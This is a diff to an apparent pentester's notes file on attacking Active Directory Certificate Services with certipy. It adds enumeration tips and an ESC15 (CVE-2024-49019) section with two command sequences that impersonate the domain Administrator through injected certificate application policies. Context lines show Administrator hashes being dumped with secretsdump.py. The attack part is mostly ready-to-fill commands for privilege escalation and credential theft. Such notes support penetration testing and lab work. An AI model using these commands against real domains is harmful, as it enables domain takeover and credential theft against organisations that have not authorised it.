@@ -27,10 +27,15 @@ Based on the results, the README will guide on the actions to take
 Usage
 ```bash
 [export KRB5CCNAME=TGT.ccache] # If we want to do this via Kerberos, we need to generate or have a TGT first (nxc --generate-tgt OR get-TGT.py)... ignore otherwise
-certipy find -u 'DOMAIN\user' -p 'pass' [-hashes <NTLM>] [-k] -target <target> -text -stdout -vulnerable
+certipy find -u 'DOMAIN\user' -p 'pass' [-hashes <NTLM>] [-k] -target <target> [-dc-ip <ip>] -text -stdout -vulnerable
 
 # Look Here
 [!] Vulnerabilities
+
+# If none vulnerable, rerun without -vulnerable... look at all the template names.
+
+# If any SIDs are present that are NOT getting resolved, try and figure out what it belongs to.
+	# rusthound might pull more info... might not... It is potentially a deleted SID we can recover -- see AD Recycle Bin notes
 ```
 
 ## ESC8
@@ -65,4 +70,33 @@ certipy auth -pfx <victim.pfx> -dc-ip <DC_ip>
 # Dump Administrator hashes
 export KRB5CCNAME=<DC.ccache>
 KRB5CCNAME=<DC.ccache> secretsdump.py -k -no-pass '<domain>'/'<hostname>$'@'<FQDN>' -just-dc-user Administrator
+```
+
+## ESC15
+ESC15, also known by the community name “EKUwu” (research by Justin Bollinger from TrustedSec) and tracked as CVE-2024-49019, describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template.
+
+_Requirements_ : 
+	Enrollee Supplies Subject is True
+	Schema Version is 1
+	Not patched for CVE-2024-49019
+
+Method 1 - If this fails, try method 2
+```bash
+# Give Certificate property to authenticate
+certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target hostname> -ca <ca_name> -template <template name> -upn administrator@<domain> -application-policies 'Client Authentication'
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
+```
+
+Method 2
+```bash
+# Generate certificate for compormised user w/ agent property to authenticate
+certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template <template name> -upn <user>@<domain> -application-policies 'Certificate Request Agent'
+
+# Request a ticket as Administrator w/ compromised user certificate
+certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target hostname> -ca <ca_name> -template User -pfx <user>.pfx -on-behalf-of '<domain>\Administrator'
+
+# Auth as administrator
+certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
 ```
